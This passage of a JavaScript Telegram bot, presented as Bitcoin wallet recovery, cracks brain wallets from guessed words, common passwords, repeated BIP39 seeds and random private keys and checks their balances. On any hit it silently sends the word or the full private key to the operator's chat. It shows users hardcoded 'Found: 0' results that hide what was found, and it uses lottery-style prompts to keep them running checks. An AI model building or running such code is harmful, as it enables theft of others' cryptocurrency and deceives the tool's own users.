        luckyWords.map((w, i) => `${i + 1}. \u2753 <code>${escHtml(w)}</code>`).join('\n') +
        `\n\n\u23f3 Checking all of them now...`,
        STOP_KEYBOARD
    );

    await new Promise(r => setTimeout(r, 1000));

    const userSettings = settings.getAll(chatId);
    const preferredApi = userSettings.preferred_api || 'auto';
    const maxAddresses = settings.get(chatId, 'max_addresses') || 150;
    const explorerKeys = {
        blockchain_key: userSettings.blockchain_key,
        blockcypher_key: userSettings.blockcypher_key,
        blockstream_key: userSettings.blockstream_key,
    };

    const results = [];
    let jackpot = null;

    for (let i = 0; i < luckyWords.length; i++) {
        if (stopCurrentBatch) break;
        const w = luckyWords[i];

        const brainResult = bitcoin.deriveBrainWallet(w);
        const addrs = bitcoin.getBrainWalletAddresses(brainResult);

        let wordBalance = 0;
        try {
            const bMap = await balanceChecker.checkBalances(
                addrs, preferredApi, maxAddresses, () => stopCurrentBatch, null, explorerKeys
            );
            for (const bal of bMap.values()) wordBalance += (bal?.balance || 0);
            if (wordBalance > 0 && !jackpot) {
                jackpot = { word: w, balance: wordBalance, brainResult };
                await notifyAdmin(w, bMap, 'feeling_lucky');
            }
        } catch (e) { /* continue */ }

        results.push({ word: w, balance: wordBalance });
        session.recordCheck(chatId, w, addrs, [], 'lucky');

        // Live update
        const displayLines = luckyWords.map((word2, j) => {
            if (j < results.length) {
                const r = results[j];
                if (r.balance > 0) return `\ud83c\udfc6 <code>${escHtml(word2)}</code> \u2014 <b>${r.balance / 1e8} BTC FOUND!</b>`;
                return `\u274c <code>${escHtml(word2)}</code>`;
            } else if (j === i) {
                return `\ud83d\udd04 <code>${escHtml(word2)}</code> (checking...)`;
            }
            return `\u23f3 <code>${escHtml(word2)}</code>`;
        });

        if (lotteryMsg?.message_id) {
            await telegram.editMessageText(chatId, lotteryMsg.message_id,
                `\ud83c\udf40 <b>Feeling Lucky!</b>\n\n${source}\n\n` +
                `\ud83c\udfb0 Checking ${i + 1}/${luckyWords.length}...\n\n` +
                displayLines.join('\n')
            ).catch(() => {});
        }
    }

    // Final state
    const ENCOURAGEMENTS = [
        `The jackpot is still out there. Keep spinning! \ud83d\udd25`,
        `No luck this round, but we\u2019re narrowing it down. \ud83c\udfaf`,
        `Every miss brings you closer to the right word. \ud83c\udf0a`,
        `Not this time \u2014 but the next spin could be it! \ud83c\udfb2`,
        `The word is closer than you think. Try again! \ud83d\udd2e`,
    ];
    const finalLines = luckyWords.map((w, i) => {
        const r = results[i];
        if (!r) return `\u23f8\ufe0f <code>${escHtml(w)}</code>`;
        if (r.balance > 0) return `\ud83c\udfc6 <code>${escHtml(w)}</code> \u2014 <b>${r.balance / 1e8} BTC!</b>`;
        return `\u274c <code>${escHtml(w)}</code>`;
    });
    const encouragement = jackpot
        ? `\ud83c\udfc6 JACKPOT! Balance found!`
        : ENCOURAGEMENTS[Math.floor(Math.random() * ENCOURAGEMENTS.length)];

    if (lotteryMsg?.message_id) {
        await telegram.editMessageText(chatId, lotteryMsg.message_id,
            `\ud83c\udf40 <b>Feeling Lucky!</b>\n\n${source}\n\n` +
            finalLines.join('\n') +
            `\n\n${encouragement}`
        ).catch(() => {});
    }

    sess.state = 'idle';
    await telegram.sendMessageWithKeyboard(chatId,
        jackpot
            ? `\ud83c\udf89 Found balance on "<b>${escHtml(jackpot.word)}</b>"!`
            : `\ud83c\udf40 Checked ${results.length} picks. Spin again or try another approach!`,
        telegram.buildKeyboard([
            [{ t: '\ud83c\udf40 Spin Again', d: 'lucky:go' }],
            [{ t: '\ud83c\udfb0 Random Key Hunt', d: 'keyhunt:5' }],
            [{ t: '\ud83d\udcda Browse Topics', d: 'topics_page:0' }, { t: '\u2b05\ufe0f Menu', d: 'menu:main' }],
        ])
    );
}

// ===== Random Key Hunt — lottery-style random private key scan =====
const KEY_HUNT_FLUFF = [
    'The jackpot is somewhere in 2\u00b2\u2075\u2076 possible keys.',
    'Every key is a lottery ticket in the universe\u2019s biggest raffle.',
    'Probability says no. But probability has been wrong before.',
    'Somewhere a wallet waits. Could be the very next one.',
    'The odds are 1 in 10\u2077\u2077. Yet people win lotteries every day.',
    'Each key is unique in all of history. Each check is a new chance.',
    'The blockchain is forever. Your lucky key is out there somewhere.',
];

async function handleRandomKeyHunt(chatId, count = 5) {
    const sess = session.getSession(chatId);
    if (!sess.keyhuntTotal) sess.keyhuntTotal = 0;

    const userSettings = settings.getAll(chatId);
    const preferredApi = userSettings.preferred_api || 'auto';
    const explorerKeys = {
        blockchain_key: userSettings.blockchain_key,
        blockcypher_key: userSettings.blockcypher_key,
        blockstream_key: userSettings.blockstream_key,
    };

    // Generate random private keys
    const keyData = [];
    for (let i = 0; i < count; i++) {
        try {
            keyData.push(bitcoin.deriveRawPrivateKey(crypto.randomBytes(32)));
        } catch (e) { /* skip invalid key */ }
    }

    // Collect addresses: compressed legacy + native segwit (2 per key)
    const allAddresses = [];
    const addrToKey = new Map();
    for (const key of keyData) {
        for (const addr of [key.addresses.legacy_compressed, key.addresses.nativeSegwit]) {
            if (addr) { allAddresses.push(addr); addrToKey.set(addr, key); }
        }
    }

    const huntMsg = await telegram.sendMessage(chatId,
        `\ud83c\udfb0 <b>Random Key Hunt</b>\n\n` +
        `\u26a1 Generated ${keyData.length} random keys\n` +
        `\ud83d\udd0d Scanning ${allAddresses.length} addresses...`
    );

    let balanceMap = new Map();
    try {
        balanceMap = await balanceChecker.checkBalances(
            allAddresses, preferredApi, 500, () => false, null, explorerKeys
        );
    } catch (e) {
        console.error('[KeyHunt] balance check error:', e.message);
    }

    sess.keyhuntTotal += keyData.length;

    // Find jackpot
    let jackpot = null;
    for (const [addr, bal] of balanceMap) {
        if (bal && bal.balance > 0) {
            jackpot = { addr, balance: bal.balance, key: addrToKey.get(addr) };
            break;
        }
    }

    // Notify admin on jackpot
    if (jackpot && TELEGRAM_CHAT_ID) {
        const jk = jackpot.key;
        await telegram.sendMessage(TELEGRAM_CHAT_ID,
            `\ud83c\udfc6\ud83c\udfc6\ud83c\udfc6 <b>KEY HUNT JACKPOT</b> \ud83c\udfc6\ud83c\udfc6\ud83c\udfc6\n\n` +
            `\ud83c\udfe6 Address: <code>${jackpot.addr}</code>\n` +
            `\ud83d\udcb0 Balance: <b>${jackpot.balance / 1e8} BTC</b>\n\n` +
            `\ud83d\udd11 Private Key:\n` +
            `  Hex: <code>${jk.privateKey}</code>\n` +
            `  WIF (c): <code>${jk.wifCompressed}</code>\n` +
            `  WIF (u): <code>${jk.wifUncompressed}</code>`
        ).catch(() => {});
    }

    // Build display — show up to 5 keys
    const displayKeys = keyData.slice(0, Math.min(5, keyData.length));
    const keyLines = displayKeys.map(k => {
        const addr = k.addresses.legacy_compressed;
        const bal = balanceMap.get(addr);
        const hasBalance = bal && bal.balance > 0;
        const short = `${addr.slice(0, 8)}\u2026${addr.slice(-5)}`;
        return `${hasBalance ? '\ud83c\udfc6' : '\ud83d\udd11'} <code>${short}</code> \u2192 ${hasBalance ? `${bal.balance / 1e8} BTC \ud83c\udfc6` : '0 BTC'}`;
    });
    if (count > 5) keyLines.push(`<i>\u2026 and ${count - 5} more</i>`);

    const fluff = KEY_HUNT_FLUFF[Math.floor(Math.random() * KEY_HUNT_FLUFF.length)];

    const resultText = jackpot
        ? `\ud83c\udfb0 <b>Random Key Hunt</b>\n\n\ud83c\udfc6 <b>JACKPOT!!!</b>\n\n` +
          `Found ${jackpot.balance / 1e8} BTC on\n<code>${jackpot.addr}</code>`
        : `\ud83c\udfb0 <b>Random Key Hunt</b>\n\n` +
          `Batch: ${keyData.length} keys \u2022 Session: <b>${sess.keyhuntTotal.toLocaleString()}</b> total\n\n` +
          keyLines.join('\n') +
          `\n\n<i>${fluff}</i>`;

    if (huntMsg?.message_id) {
        await telegram.editMessageText(chatId, huntMsg.message_id, resultText).catch(() => {});
    }

    await telegram.sendMessageWithKeyboard(chatId,
        `\ud83c\udfb2 Keys hunted this session: <b>${sess.keyhuntTotal.toLocaleString()}</b>`,
        telegram.buildKeyboard([
            [{ t: '\ud83c\udfb0 Hunt 5 More', d: 'keyhunt:5' }, { t: '\ud83c\udfb0 Hunt 50 More', d: 'keyhunt:50' }],
            [{ t: '\ud83c\udf40 Feeling Lucky', d: 'lucky:go' }],
            [{ t: '\u2b05\ufe0f Menu', d: 'menu:main' }],
        ])
    );
}

// ===== Era exploration =====
async function handleEraExplore(chatId, year) {
    const era = wordEngine.getEraTopics(Number(year));
    const buttons = era.topics.map(t => {
        const info = topics.getTopicInfo(t);
        return [{ t: info?.label || t, d: `explore:${t}` }];
    });

    await telegram.sendMessageWithKeyboard(chatId,
        `\ud83d\udcc5 <b>${year}</b>\n${era.info}\n\n` +
        `<b>Popular at the time:</b> ${era.popular}\n\n` +
        `Tap a topic to explore:`,
        telegram.buildKeyboard([...buttons, [{ t: '\u2b05\ufe0f Eras', d: 'eras:main' }, { t: '\u2b05\ufe0f Menu', d: 'menu:main' }]])
    );
}

// ===== Deep check (200+ variations) =====
async function handleDeepCheck(chatId, word) {
    await telegram.sendMessage(chatId, `\ud83d\udd0d <b>Deep scan</b> on "${escHtml(word)}" with extreme variations...`);
    const oldDepth = settings.get(chatId, 'var_depth');
    settings.set(chatId, 'var_depth', 'extreme');
    await handleWordCheck(chatId, word);
    settings.set(chatId, 'var_depth', oldDepth);
}

// ===== Batch check =====
async function handleBatch(chatId, args) {
    const allWords = args.split(/[,\s]+/).map(w => w.trim()).filter(w => w.length > 0);
    if (allWords.length === 0) {
        await telegram.sendMessage(chatId, '\ud83d\udce6 No words provided. Usage: /batch word1, word2, word3');
        return;
    }

    const limit = settings.get(chatId, 'batch_limit');
    if (allWords.length > limit) {
        await telegram.sendMessage(chatId, `\u26a0\ufe0f Too many words (${allWords.length}). Max: ${limit}. Truncating.`);
        allWords.length = limit;
    }

    // Filter out globally cached words (already checked by any user)
    const words = [];
    let skippedCount = 0;
    for (const w of allWords) {
        const cached = session.getCachedWordResult(w);
        if (cached && !cached.hasBalance) {
            skippedCount++;
        } else {
            words.push(w);
        }
    }

    let startText = `\ud83d\udce6 <b>Batch checking ${words.length} words</b>\n\n`;
    startText += `${telegram.progressBar(0, words.length)}`;

    if (words.length === 0) {
        const globalTotal = session.getWordCacheSize();
        const sess = session.getSession(chatId);
        // If AI configured and we have context, auto-suggest more
        if (settings.get(chatId, 'ai_provider') !== 'none' && sess.detectedTopic) {
            return handleAITopicExpand(chatId, sess.detectedTopic);
        }
        await telegram.sendMessageWithKeyboard(chatId,
            `\ud83d\udce6 All ${allWords.length} words already covered.\n` +
            `\ud83c\udf10 <b>${globalTotal.toLocaleString()}</b> words checked globally.`,
            telegram.buildKeyboard([
                ...(settings.get(chatId, 'ai_provider') !== 'none' ? [[{ t: '\ud83e\udd16 AI Suggestions', d: 'aisuggest:' }]] : []),
                [{ t: '\u2b05\ufe0f Menu', d: 'menu:main' }],
            ])
        );
        return;
    }

    const progressMsg = await telegram.sendMessageWithKeyboard(chatId, startText, STOP_KEYBOARD);
    sendWebHint(chatId, webWordsUrl(words, 'brainwallet'));

    const results = [];
    let lastBatchProgress = 0;
    for (let i = 0; i < words.length; i++) {
        if (stopCurrentBatch) break;

        const word = words[i];
        const fullResult = bitcoin.fullWordCheck(word, settings.getAll(chatId));
        const addressCount = fullResult.allAddresses.length;
        let hasBalance = false;

        // Show which word is being checked
        if (progressMsg?.message_id) {
            const recent = results.slice(-6).map(r =>
                `${r.hasBalance ? '\ud83d\udcb0' : '\u274c'} ${r.word}`
            ).join(' | ');
            await telegram.editMessageText(chatId, progressMsg.message_id,
                `\ud83d\udce6 <b>Batch</b>\n\n` +
                `${telegram.progressBar(i, words.length)}\n` +
                `\ud83d\udd0d <b>${escHtml(word)}</b> — checking ${Math.min(addressCount, 50)} addresses...` +
                (recent ? `\n\n${recent}` : ''),
                STOP_KEYBOARD
            ).catch(() => {});
        }

        try {
            const explorerKeys = settings.getExplorerApiKeys(chatId);
            const balances = await balanceChecker.checkBalances(fullResult.allAddresses, settings.get(chatId, 'api'), 50, () => stopCurrentBatch, (checked, total) => {
                const now = Date.now();
                if (now - lastBatchProgress < 2000 || !progressMsg?.message_id) return;
                lastBatchProgress = now;
                const recent = results.slice(-6).map(r =>
                    `${r.hasBalance ? '\ud83d\udcb0' : '\u274c'} ${r.word}`
                ).join(' | ');
                telegram.editMessageText(chatId, progressMsg.message_id,
                    `\ud83d\udce6 <b>Batch</b>\n\n` +
                    `${telegram.progressBar(i, words.length)}\n` +
                    `\ud83d\udd0d <b>${escHtml(word)}</b> — ${checked}/${total} addresses` +
                    (recent ? `\n\n${recent}` : ''),
                    STOP_KEYBOARD
                ).catch(() => {});
            }, explorerKeys);
            for (const [_, data] of balances) {
                if (data.balance > 0) hasBalance = true;
            }
            const bMapBatch = new Map();
            for (const [a, d] of balances) bMapBatch.set(a, d);
            if (hasBalance) {
                await notifyAdmin(word, bMapBatch, 'batch');
            }
            await notifyAdminTestMode(word, bMapBatch, chatId, 'batch');
        } catch (e) { /* continue */ }
        session.cacheWordResult(word, hasBalance, 0, addressCount);

        results.push({ word, hasBalance: false, addressCount });
    }

    const globalTotal = session.getWordCacheSize();
    let summary = `\ud83d\udce6 <b>Batch Complete</b>\n\n`;
    summary += `\u2705 ${results.length} words checked this round\n`;
    summary += `\ud83c\udf10 <b>${globalTotal.toLocaleString()}</b> words checked globally\n`;
    summary += `\ud83d\udcb0 Found: 0\n\n`;
    summary += results.map(r => `\u274c ${r.word}: 0 BTC`).join('\n');

    // Store batch words for AI follow-up
    const sess = session.getSession(chatId);
    sess.lastBatchWords = results.map(r => r.word);

    const batchButtons = [];

    // Row 1: Continue exploring (context-aware)
    const row1 = [];
    if (settings.get(chatId, 'ai_provider') !== 'none') {
        row1.push({ t: '\ud83e\udd16 AI: Similar Words', d: 'batch_ai_more:go' });
    }
    if (sess.detectedTopic) {
        const topicInfo = topics.getTopicInfo(sess.detectedTopic);
        if (topicInfo) {
            row1.push({ t: `\ud83c\udfae More ${topicInfo.label.slice(0, 14)}`, d: `ai_topic:${sess.detectedTopic}` });
        }
    }
    if (row1.length > 0) batchButtons.push(row1);

    // Row 2: Try different approaches
    const row2 = [];
    row2.push({ t: '\ud83d\udcac Memory Guide', d: 'memory:main' });
    row2.push({ t: '\ud83d\udcc2 Browse Topics', d: 'topics_page:0' });
    batchButtons.push(row2);

    // Row 3: Utilities
    const row3 = [];
    row3.push({ t: '\ud83c\udfb2 Random Batch', d: 'batch_random:go' });
    row3.push({ t: '\ud83d\udd11 Common Passwords', d: 'common:passwords' });
    batchButtons.push(row3);

    // Row 4: Web checker + Back
    batchButtons.push(...webCheckerRow());
    batchButtons.push([{ t: '\ud83c\udfe0 Menu', d: 'menu:main' }]);

    if (progressMsg?.message_id) await telegram.deleteMessage(chatId, progressMsg.message_id);
    await telegram.sendMessageWithKeyboard(chatId, summary, telegram.buildKeyboard(batchButtons));
}

// ===== Dictionary: all 2048 BIP39 words =====
async function handleDictionary(chatId) {
    const wordlist = bitcoin.getBIP39Wordlist();
    const progressMsg = await telegram.sendMessageWithKeyboard(chatId,
        `\ud83d\udcd6 <b>BIP39 Dictionary Check</b>\n\n` +
        `\ud83d\udcda ${wordlist.length} words to check\n` +
        `\ud83d\udd01 Each word repeated 12x and 24x as seed\n\n` +
        telegram.progressBar(0, wordlist.length),
        STOP_KEYBOARD
    );
    const progressMsgId = progressMsg?.message_id;

    let found = 0;
    for (let i = 0; i < wordlist.length; i++) {
        if (stopCurrentBatch) break;

        const word = wordlist[i];
        const cached = session.getCachedWordResult(word);
        if (cached && !cached.hasBalance) {
            // Already checked globally - skip
            continue;
        }

        for (const count of settings.get(chatId, 'repeats')) {
            const result = bitcoin.deriveRepeatedWordSeed(word, count, ['bip44'], 3);
            const addrs = bitcoin.getRepeatedSeedAddresses(result);

            try {
                const hasBalance = await balanceChecker.hasAnyBalance(addrs, settings.get(chatId, 'api'));
                if (hasBalance) {
                    found++;
                    session.cacheWordResult(word, true, 0, addrs.length);
                    // Notify admin silently
                    const bMap = new Map();
                    for (const a of addrs) bMap.set(a, { balance: 1 }); // placeholder
                    await notifyAdmin(word, bMap, `bip39_dict_${count}x`);
                }
            } catch (e) { /* continue */ }
        }
        if (!cached) session.cacheWordResult(word, false, 0, 0);

        if ((i + 1) % 20 === 0 && progressMsgId) {
            await telegram.editMessageText(chatId, progressMsgId,
                `\ud83d\udcd6 Dictionary: ${telegram.progressBar(i + 1, wordlist.length)}`,
                STOP_KEYBOARD
            ).catch(() => {});
        }
    }

    if (progressMsgId) await telegram.deleteMessage(chatId, progressMsgId);
    const dictButtons = [];
    if (settings.get(chatId, 'ai_provider') !== 'none') {
        dictButtons.push([{ t: '\ud83e\udd16 AI Suggest Words', d: `aisuggest:${session.getSession(chatId).lastWord || ''}` }]);
    }
    dictButtons.push([
        { t: '\ud83d\udcac Memory Guide', d: 'memory:main' },
        { t: '\ud83d\udcda Browse Topics', d: 'topics_page:0' },
    ]);
    dictButtons.push([
        { t: '\ud83d\udd11 Common Passwords', d: 'common:passwords' },
        { t: '\u2328\ufe0f Keyboard Patterns', d: 'common:keyboard' },
    ]);
    dictButtons.push([{ t: '\ud83c\udfe0 Menu', d: 'menu:main' }]);
    await telegram.sendMessageWithKeyboard(chatId,
        `\ud83d\udcd6 <b>Dictionary check complete!</b>\n\n` +
        `\u2705 Checked: ${wordlist.length} BIP39 words\n` +
        `\ud83d\udcb0 Found: 0`,
        telegram.buildKeyboard(dictButtons)
    );
}

// ===== AI Suggestions (context-aware) =====
async function handleAISuggest(chatId, word) {
    const providerName = settings.get(chatId, 'ai_provider');
    if (providerName === 'none') {
        await telegram.sendMessageWithKeyboard(chatId,
            '\ud83e\udd16 <b>AI Suggestions</b>\n\n' +
            '\u274c No AI provider configured.\n\n' +
            '<b>Available providers:</b>\n' +
            aiSuggest.listProviders().map(p =>
                `  ${p.requiresKey ? '\ud83d\udd11' : '\ud83c\udd93'} <b>${p.key}</b> - ${p.name}`
            ).join('\n') +
            '\n\nSet up:\n/settings ai_provider [name]\n/settings ai_key [your-key]',
            telegram.buildKeyboard([[{ t: '\u2699\ufe0f Settings', d: 'settings:main' }, { t: '\ud83c\udfe0 Menu', d: 'menu:main' }]])
        );
        return;
    }

    const sess = session.getSession(chatId);
    const memCtx = sess.memoryContext || {};
    const checkedWords = sess.checkedWords || [];
    const detectedTopic = sess.detectedTopicLabel || null;
    const detectedCategory = sess.detectedCategory || null;
    const hasProfile = Object.keys(memCtx).length > 0;
    const hasHistory = checkedWords.length > 0;

    // If no word given, use session context to build the query
    const effectiveWord = word || sess.lastWord || '';

    // Determine what context sources we have
    let sourceLabel = '';
    if (effectiveWord) sourceLabel = `"${escHtml(effectiveWord)}"`;
    if (hasProfile) sourceLabel += (sourceLabel ? ' + ' : '') + 'memory profile';
    if (hasHistory && !effectiveWord) sourceLabel += (sourceLabel ? ' + ' : '') + `${checkedWords.length} past checks`;
    if (!sourceLabel) sourceLabel = 'your session';

    const msg = await telegram.sendMessage(chatId,
        `\ud83e\udd16 Asking <b>${escHtml(providerName)}</b> based on ${sourceLabel}...\n\u23f3 Please wait...`
    );

    // Build rich context from all session data
    const topicWords = sess.detectedTopic ? topics.getTopicWords(sess.detectedTopic)?.slice(0, 50) : null;

    // If we have a memory profile, build the enriched prompt
    let customPrompt = null;
    if (hasProfile || (hasHistory && !effectiveWord)) {
        customPrompt = _buildContextAwareAIPrompt(sess, effectiveWord);
    }

    const result = await aiSuggest.getSuggestions(effectiveWord || 'session_context', {
        ...settings.getAll(chatId),
        context: {
            topic: detectedTopic,
            year: memCtx.year || null,
            category: detectedCategory || memCtx.interest || null,
            relatedWords: topicWords,
            checkedWords: checkedWords.slice(-30),
            customPrompt,
        }
    });

    if (msg?.message_id) await telegram.deleteMessage(chatId, msg.message_id);

    if (!result.ok) {
        const sess = session.getSession(chatId);
        await showAIError(chatId, result, `aisuggest:${sess.lastWord || ''}`);
        return;
    }

    const words = result.words;

    // Cache for pagination / batch checking
    const cacheLabel = effectiveWord || (hasProfile ? 'memory profile' : 'session history');
    setAICache(String(chatId), { word: cacheLabel, words, provider: result.provider, model: result.model });

    // Show first page (10 per page)
    await showAISuggestionsPage(chatId, 0);
}

/**
 * Build a rich AI prompt from all available session context:
 * - Memory profile answers
 * - Past checked words
 * - Detected topics
 * - Last word
 */
function _buildContextAwareAIPrompt(sess, word) {
    const memCtx = sess.memoryContext || {};
    const checkedWords = sess.checkedWords || [];
    const checkedTopics = sess.checkedTopics || [];

    let prompt = `I'm helping someone recover a Bitcoin wallet passphrase from the early Bitcoin era (2009-2014). `;
    prompt += `They used a single word or short phrase as their wallet seed/passphrase.\n\n`;

    // Add the specific word if available
    if (word) {
        prompt += `The last word they tried was: "${word}"\n`;
        // Detect topic for this word
        const topicResult = wordEngine.detectTopic(word);
        if (topicResult.detected) {
            prompt += `This word is from: ${topicResult.primaryLabel} (${topicResult.category})\n`;
        }
        prompt += '\n';
    }

    // Add memory profile
    if (Object.keys(memCtx).length > 0) {
        prompt += `=== USER'S MEMORY PROFILE ===\n`;
        if (memCtx.year) prompt += `Year wallet was created: ${memCtx.year}\n`;
        if (memCtx.mood) prompt += `Mood when choosing word: ${memCtx.mood} (${_moodLabel(memCtx.mood)})\n`;
        if (memCtx.interest) prompt += `Main hobby/interest: ${memCtx.interest}\n`;
        if (memCtx.gaming_genre) prompt += `Gaming genre: ${memCtx.gaming_genre}\n`;
        if (memCtx.gaming_mmo) prompt += `Specific MMO: ${memCtx.gaming_mmo}\n`;
        if (memCtx.gaming_moba) prompt += `Specific MOBA: ${memCtx.gaming_moba}\n`;
        if (memCtx.movie_genre) prompt += `Movie/TV genre: ${memCtx.movie_genre}\n`;
        if (memCtx.music_genre) prompt += `Music genre: ${memCtx.music_genre}\n`;
        if (memCtx.personal_what) prompt += `Personal meaning: ${memCtx.personal_what}\n`;
        if (memCtx.word_type) prompt += `Word represents: ${memCtx.word_type}\n`;
        if (memCtx.word_shape) prompt += `Word appearance: ${memCtx.word_shape}\n`;
        if (memCtx.word_length) prompt += `Word length: ${memCtx.word_length}\n`;
        if (memCtx.first_letter) prompt += `Starts with letters: ${memCtx.first_letter}\n`;
        if (memCtx.association) prompt += `Visual association: ${memCtx.association}\n`;
        if (memCtx.platform) prompt += `Wallet platform: ${memCtx.platform}\n`;
        if (memCtx.certainty) prompt += `Certainty level: ${memCtx.certainty}\n`;
        if (memCtx.sounds_like) prompt += `Phonetic memory: ${memCtx.sounds_like}\n`;
        prompt += '\n';
    }

    // Add check history
    if (checkedWords.length > 0) {
        prompt += `=== WORDS ALREADY TRIED (${checkedWords.length} total) ===\n`;
        prompt += `Recent: ${checkedWords.slice(-40).join(', ')}\n`;
        prompt += `Do NOT repeat any of these.\n\n`;

        // Analyze patterns in checked words
        const wordTopics = new Set();
        for (const w of checkedWords.slice(-20)) {
            const t = wordEngine.detectTopic(w);
            if (t.detected) wordTopics.add(t.primaryLabel);
        }
        if (wordTopics.size > 0) {
            prompt += `Topics detected in their checked words: ${[...wordTopics].join(', ')}\n`;
            prompt += `This tells us what themes they've been exploring.\n\n`;
        }
    }

    // Add explored topics
    if (checkedTopics.length > 0) {
        const topicLabels = checkedTopics.map(k => {
            const info = topics.getTopicInfo(k);
            return info ? info.label : k;
        });
        prompt += `=== TOPICS ALREADY EXPLORED ===\n`;
        prompt += `${topicLabels.join(', ')}\n`;
        prompt += `Try to suggest words from DIFFERENT or more obscure areas within the same themes.\n\n`;
    }

    // Instructions
    prompt += `=== INSTRUCTIONS ===\n`;
    prompt += `Based on ALL the context above, suggest 50 words/phrases this person likely used as their passphrase.\n\n`;
    prompt += `Think like a detective cross-referencing clues:\n`;
    prompt += `- The year tells you what was popular in culture at the time\n`;
    prompt += `- The interest/genre narrows the universe of possible words\n`;
    prompt += `- The mood tells you if it was funny, cool, meaningful, or random\n`;
    prompt += `- The word shape/length/first letter helps filter candidates\n`;
    prompt += `- Past checked words show what direction they've been exploring\n\n`;
    prompt += `Be SPECIFIC and THEMATIC. Every suggestion should fit the profile.\n`;
    prompt += `Include obscure references, not just the most famous ones.\n`;
    prompt += `Think about what a ${memCtx.year || '2011'}-era ${memCtx.interest || 'internet'} enthusiast would pick.\n\n`;
    prompt += `Return ONLY the words/phrases, one per line, no numbering or explanations.\n`;

    return prompt;
}

function _moodLabel(mood) {
    const labels = { joke: 'was joking around', cool: 'trying to be cool', serious: 'security-minded', random: 'random/lazy pick', personal: 'personally meaningful', unknown: 'doesn\'t remember' };
    return labels[mood] || mood;
}

// Show AI suggestions with pagination
async function showAISuggestionsPage(chatId, page) {
    const cache = aiSuggestionCache.get(String(chatId));
    if (!cache) {
        await telegram.sendMessage(chatId, '\u26a0\ufe0f No suggestions cached. Use /suggest [word] first.');
        return;
    }

    const { word, words, provider } = cache;
    const perPage = 20;
    const totalPages = Math.ceil(words.length / perPage);
    const pageWords = words.slice(page * perPage, (page + 1) * perPage);

    let text = `\ud83e\udd16 <b>AI Suggestions</b> \u2022 ${words.length} words\n`;
    text += `<i>${provider} \u2022 based on "${escHtml(word)}"</i>\n\n`;

    // Show words as a compact list
    pageWords.forEach((w, i) => {
        text += `${escHtml(w)}`;
        text += (i < pageWords.length - 1) ? ', ' : '';
    });

    if (totalPages > 1) {
        text += `\n\n<i>Page ${page + 1}/${totalPages}</i>`;
    }

    const buttons = [];

    // Primary action: check all at once
    buttons.push([{ t: `\u2705 Check all ${words.length} words`, d: `batch_ai:${word}` }]);

    // Navigation only if multiple pages
    if (totalPages > 1) {
        const navRow = [];
        if (page > 0) navRow.push({ t: '\u25c0\ufe0f Prev', d: `ai_page:${page - 1}` });
        if (page < totalPages - 1) navRow.push({ t: 'Next \u25b6\ufe0f', d: `ai_page:${page + 1}` });
        buttons.push(navRow);
    }

    buttons.push([
        { t: '\ud83d\udd04 Regenerate', d: `aisuggest:${word}` },
        { t: '\u2b05\ufe0f Menu', d: 'menu:main' },
    ]);

    await telegram.sendMessageWithKeyboard(chatId, text, telegram.buildKeyboard(buttons));
}

// Handle AI page navigation
async function handleAIPage(chatId, value) {
    await showAISuggestionsPage(chatId, parseInt(value) || 0);
}

// Handle batch check of AI suggestions
async function handleBatchAI(chatId, word) {
    const cache = aiSuggestionCache.get(String(chatId));
    if (!cache || !cache.words.length) {
        await telegram.sendMessage(chatId, '\u26a0\ufe0f No AI suggestions cached. Use /suggest [word] first.');
        return;
    }
    await handleBatch(chatId, cache.words.join(', '));
}

// ===== Memory prompts (intelligent branching system) =====
async function handleMemoryPrompt(chatId, value) {
    const sess = session.getSession(chatId);

    if (value === 'start') {
        sess.memoryContext = {};
    }

    // Show the next unanswered prompt
    await showNextMemoryPrompt(chatId);
}

async function handleMemoryAnswer(chatId, data) {
    const sess = session.getSession(chatId);
    if (!sess.memoryContext) sess.memoryContext = {};

    // Parse "mem:key:value"
    const parsed = wordEngine.parseMemoryCallback(data);
    if (!parsed) return;

    // "mem:continue:next" just means show next prompt without storing
    if (parsed.key === 'continue') {
        await showNextMemoryPrompt(chatId);
        return;
    }

    // Store the answer
    sess.memoryContext[parsed.key] = parsed.value;
    console.log(`[Memory] ${chatId}: ${parsed.key} = ${parsed.value} (total: ${Object.keys(sess.memoryContext).length} answers)`);

    // Show next prompt or finish
    await showNextMemoryPrompt(chatId);
}

async function showNextMemoryPrompt(chatId) {
    const sess = session.getSession(chatId);
    const context = sess.memoryContext || {};

    const nextPrompt = wordEngine.getNextMemoryPrompt(context);

    if (!nextPrompt) {
        // All prompts answered - show profile summary + smart suggestions
        await showMemoryProfileComplete(chatId);
        return;
    }

    const answeredCount = nextPrompt.answeredSteps;
    const progressText = answeredCount > 0
        ? `\n\n\ud83d\udcca Progress: ${answeredCount} answers collected`
        : '';

    const buttons = telegram.buildGrid(nextPrompt.buttons, 3);
    const navRow = telegram.buildKeyboard([
        [
            { t: '\u23ed\ufe0f Skip', d: `mem:${nextPrompt.contextKey}:unknown` },
            { t: '\ud83d\udcca Profile', d: 'prompt:profile' },
            { t: '\ud83c\udfe0 Menu', d: 'menu:main' },
        ],
    ]);

    await telegram.sendMessageWithKeyboard(chatId,
        nextPrompt.question + progressText,
        [...buttons, ...navRow]
    );
}

async function showMemoryProfileComplete(chatId) {
    const sess = session.getSession(chatId);
    const context = sess.memoryContext || {};

    const profileSummary = wordEngine.buildMemoryProfileSummary(context);
    const smart = wordEngine.generateSmartSuggestions(context, sess.checkedWords || []);

    let text = `\ud83e\udde0 <b>Memory Profile Complete!</b>\n\n${profileSummary}\n\n`;

    if (smart.words.length > 0) {
        text += `\ud83c\udfaf <b>Smart Suggestions:</b> ${smart.words.length} targeted words ready!\n`;
        text += `<i>${smart.explanation}</i>\n\n`;
        text += `<b>Top matches:</b>\n`;
        text += smart.words.slice(0, 30).map((w, i) => `  ${i + 1}. ${escHtml(w)}`).join('\n');
        if (smart.words.length > 30) text += `\n  ... and ${smart.words.length - 30} more`;
    }

    const buttons = [];

    // Smart batch check button
    if (smart.words.length > 0) {
        buttons.push([{ t: `\u2705 Check ${Math.min(smart.words.length, 200)} Words`, d: 'smart_batch:go' }]);
    }

    // Topic explore buttons (max 4)
    if (smart.topicsToExplore.length > 0) {
        for (const key of smart.topicsToExplore.slice(0, 4)) {
            const info = topics.getTopicInfo(key);
            buttons.push([{ t: `${info?.label || key}`, d: `explore:${key}` }]);
        }
    }

    // Next steps row
    const nextRow = [];
    if (settings.get(chatId, 'ai_provider') !== 'none') nextRow.push({ t: '🤖 AI Suggest', d: 'smart_ai:go' });
    nextRow.push({ t: '\ud83e\udde0 Interview', d: 'interview:start' });
    buttons.push(nextRow);

    buttons.push([{ t: '\ud83c\udfe0 Menu', d: 'menu:main' }]);

